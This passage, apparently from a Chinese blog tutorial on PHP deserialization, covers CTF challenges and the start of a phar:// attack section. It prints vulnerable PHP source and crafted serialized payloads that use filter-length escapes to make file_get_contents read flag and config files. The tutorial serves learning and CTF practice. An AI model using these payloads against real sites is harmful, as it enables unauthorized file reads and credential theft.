class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># profile.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">data</span>:<span class="title">image</span>/<span class="title">gif</span>;<span class="title">base64</span>,&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">photo</span>; ?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h3</span>&gt;<span class="title">Hi</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">nickname</span>;?&gt;&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span>&gt;<span class="title">Phone</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">phone</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span>&gt;<span class="title">Email</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">email</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$profile = unserialize($profile);</code> 将填写的信息进行反序列化输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到 flag 存在于 config.php 文件当中，我们想办法读取到 config.php</p><blockquote><p><strong>思路：</strong>在 profile.php 中存在 <code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code> ；而 <code>$profile</code> 是一个数组，里面是我们输入的信息。如果我们控制 <code>$profile[&#39;photo&#39;]</code> 为 <code>config.php</code> 那么 之后的 <code>&lt;?php echo $phone;?&gt;</code> 将会显示出 base64 编码后的 config.php 文件内容，我们就会获取到 flag。</p></blockquote><p><strong>测试：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$profile</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET传参：?p=<span class="number">123</span>&amp;e=<span class="number">123</span>@qq.com&amp;n=aaa&amp;o=config.php</span><br><span class="line">输出：a:<span class="number">4</span>:a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;123@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>更改 nickname 的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET传参：?p=<span class="number">123</span>&amp;e=<span class="number">123</span>@qq.com&amp;n=<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&amp;o=config.php</span></span><br><span class="line"><span class="string">输出：a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:3:&quot;</span><span class="number">123</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:10:&quot;</span><span class="number">123</span>@qq.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:34:&quot;</span><span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>字符增加替换 ，考虑到 update.php 以及 class.php 中的过滤，我们传入 数组 nickname[]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><p><img src="https://i.loli.net/2021/06/13/Wd1MD8Af4JGy2pe.png" alt="image-20210613183651536"></p><p><img src="https://i.loli.net/2021/06/13/Na6dklr1qA8v2Yo.png" alt="image-20210613183539171"></p><p>解码得 flag</p><p><img src="https://i.loli.net/2021/06/13/zjiFCvMSHx7PDdO.png" alt="image-20210613183613090"></p><h2 id="2-5-字符减少-—-安洵杯-2019-easy-serialize-php"><a href="#2-5-字符减少-—-安洵杯-2019-easy-serialize-php" class="headerlink" title="2.5 字符减少 — [安洵杯 2019]easy_serialize_php"></a>2.5 字符减少 — [安洵杯 2019]easy_serialize_php</h2><p><a href="https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_serialize_php">题目链接</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><ol><li>根据提示：?f=phpinfo</li></ol></blockquote><p>发现</p><p><img src="https://i.loli.net/2021/06/13/ZhFTAEVcpUiew78.png" alt="image-20210613154055563"></p><blockquote><ol start="2"><li>auto_append_file 在任何页面输出前首先包含 d0g3_f1ag.php文件，猜测 flag存在于 该文件当中。那我们需要想办法读取到该文件；</li><li>当 <code>$function == &#39;show_image&#39;</code> 时，首先对 <code>$serialize_info</code> 进行反序列化，然后对其中 <code>$userinfo[&#39;img&#39;]</code> 进行base64解码之后，使用 <code>file_get_contents</code> 读取出文件；而 <code>$serialize_info</code> 正是我们所传入的 <code>$function</code> 在 进行 <code>filter()</code> 函数过滤之后的结果；</li></ol></blockquote><p>手动添加以下代码，输出查看序列化之后的内容：</p><p><img src="https://i.loli.net/2021/06/13/cjrJVkIPAGnb1To.png" alt="image-20210613164010874"></p><p>该 base64 编码 <code>Z3Vlc3RfaW1nLnBuZw==</code> 即是 <code>guest_img.png</code></p><blockquote><ol start="4"><li>我们需要使 <code>键 img </code> 为 <code>d0g3_f1ag.php</code> 文件加密之后的内容；<code>ZDBnM19mMWFnLnBocA==</code> 是 <code>d0g3_f1ag.php</code></li></ol></blockquote><p>构造 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">post 传参：</span><br><span class="line">   </span><br><span class="line">_SESSION[user]=a&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">p</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化后 </span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">128</span>) <span class="string">&quot;a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:1:&quot;</span>a<span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">42</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;&quot;</span> </span><br></pre></td></tr></table></figure><p>以上内容如果进行反序列化，将会报错，原因：</p><blockquote><ol start="5"><li>前面 <code>a:3:</code> 表示 SESSION 含有三个键值对，它会一直向后取直到取到三个为止；第一个 user 正常取值；第二个 function 由于长度是 42 ，将会取到的值是 <code>p&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code> ；所以仍旧会取到第三个 img 值为 <code>Z3Vlc3RfaW1nLnBuZw==</code> ；但是进行反序列化之后，我们希望得到的是第三个 img 被挤掉，以我们在 function 中传递的 img 作为新的 img ；所以实际上如果 <code>s:42:&quot;p&quot;</code> 是 <code>s:1:&quot;p&quot;</code> 就好了。 </li><li>利用过滤函数使字符减少来增大长度，吞掉后面部分内容。</li></ol></blockquote><p>测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">b</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回 string(127) &quot;a:3:&#123;s:4:&quot;user&quot;;s:4:&quot;&quot;;s:8:&quot;function&quot;;s:42:&quot;b&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; </span></span><br></pre></td></tr></table></figure><blockquote><ol start="7"><li><code>&quot;;s:8:&quot;function&quot;;s:42:&quot;b</code> 长度是 24，构造 user 值是 6个 flag ，即长度是 24，将会把 <code>&quot;;s:8:&quot;function&quot;;s:42:&quot;b</code>吞掉，当作 user 的值；而 img 即为我们的 <code>d0g3_f1ag.php</code>；再手动补充一个键值对（随意）满足 _SESSION 的三个键；而位于最后的默认的 <code>guest_img.png</code> 将被挤掉，不会起作用；</li></ol><p> <strong>注意：</strong>由于吞掉了一个键值对，我们把 img 作为第二个键名存在了，但 SESSION 本身是有三个键值对的，如果我们不手动添加一个键值对的话，最后存在的原本的 img 也将会被解析，起不到挤掉的作用。</p></blockquote><p><strong>payload1 —  键值逃逸：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">b</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化后 string(146) &quot;a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:60:&quot;b&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;c&quot;;s:3:&quot;111&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; </span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/13/dbMkafNKIsSPulh.png" alt="0"></p><blockquote><ol start="8"><li>对 <code>/d0g3_fllllllag</code> 进行 base64编码为 <code>L2QwZzNfZmxsbGxsbGFn</code>，长度是 20；</li></ol><p> 构造以下内容：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">b</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/13/LroXScDCuzgTatf.png" alt="image-20210613172316408"></p><blockquote><ol start="9"><li><code>&quot;;s:49:</code> 长度是 7，构造 键名为 flagphp，将其吞掉作为一个新的键名，值是 db；第二个键名 img 即是我们所构造的；由于 <code>a:2:</code>，因此一共只会取两个键名，所以最后的 img 被挤掉了。</li></ol></blockquote><p><strong>payload2 —  键名逃逸：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagphp]=;s:<span class="number">2</span>:<span class="string">&quot;db&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化后 string(108) &quot;a:2:&#123;s:7:&quot;&quot;;s:49:&quot;;s:2:&quot;db&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><strong>函数总结：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">implode()把数组元素组合为一个字符串后返回：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;Hello&#x27;</span>,<span class="string">&#x27;World!&#x27;</span>,<span class="string">&#x27;Beautiful&#x27;</span>,<span class="string">&#x27;Day!&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> implode(<span class="string">&quot; &quot;</span>,<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment"># 返回 Hello World! Beautiful Day!</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">unset</span>()销毁指定的变量    </span><br><span class="line">    </span><br><span class="line">extract() 函数从数组中将变量导入到当前的符号表</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;Original&quot;</span>;</span><br><span class="line"><span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;Horse&quot;</span>);</span><br><span class="line">extract(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment"># 返回 $a = Cat; $b = Dog; $c = Horse </span></span><br><span class="line">该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</span><br><span class="line"></span><br><span class="line">第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。</span><br><span class="line"></span><br><span class="line">该函数返回成功导入到符号表中的变量数目。</span><br></pre></td></tr></table></figure><h1 id="三、phar-序列化"><a href="#三、phar-序列化" class="headerlink" title="三、phar 序列化"></a>三、phar 序列化</h1><p><a href="https://www.cnblogs.com/zzjdbk/p/13030571.html">https://www.cnblogs.com/zzjdbk/p/13030571.html</a></p><p><a href="https://blog.csdn.net/qq975353472/article/details/109668373">https://blog.csdn.net/qq975353472/article/details/109668373</a></p><p><a href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></p><p>一般利用反序列化漏洞，一般都是借助unserialize()函数。</p><p><strong>新型攻击方式：利用Phar:// 伪协议读取phar文件时，会反序列化meta-data储存的信息。</strong></p><ul><li>特点：不使用 <code>unserialize()函数</code></li></ul><p><strong>利用条件：</strong></p><ul><li>能够上传 <code>.phar</code> 文件至服务器</li><li>存在可用的 魔术方法 作为跳板</li><li>文件操作函数的参数可控</li><li><code>/  :   phar</code>  等特殊字符未被过滤</li></ul><p><strong>受影响函数列表：</strong></p><p><img src="https://i.loli.net/2021/08/16/Gg6PJzalCAp9mhr.png" alt="image-20210816150354206"></p><p>原理参考 <a href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p><h2 id="3-1-phar-介绍"><a href="#3-1-phar-介绍" class="headerlink" title="3.1 phar 介绍"></a>3.1 phar 介绍</h2><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，会以序列化的形式存储用户自定义的 <code>meta-data</code> ，当受影响的文件操作函数调用 phar 文件时，会自动反序列化 meta-data 中的内容。</p><p>在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。用来将多个PHP文件打包为一个文件.可以和tar zip相互转化。</p><ul><li>版本 &gt;5.2</li></ul><p><strong>php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。</strong>内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 <strong>phar://就是一种内置的流包装器。</strong></p><p><strong>php中一些常见的流包装器如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure><h2 id="3-2-phar-文件结构"><a href="#3-2-phar-文件结构" class="headerlink" title="3.2 phar 文件结构"></a>3.2 phar 文件结构</h2><ul><li><p>a stub</p><p>phar 文件的标志，前面内容不限，必须以 __HALT_COMPILER();?&gt; 结尾，否则 phar 扩展将无法识别该文件是 phar文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</span><br></pre></td></tr></table></figure></li><li><p>a manifest describing the contents</p><p>Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点。</p><p><img 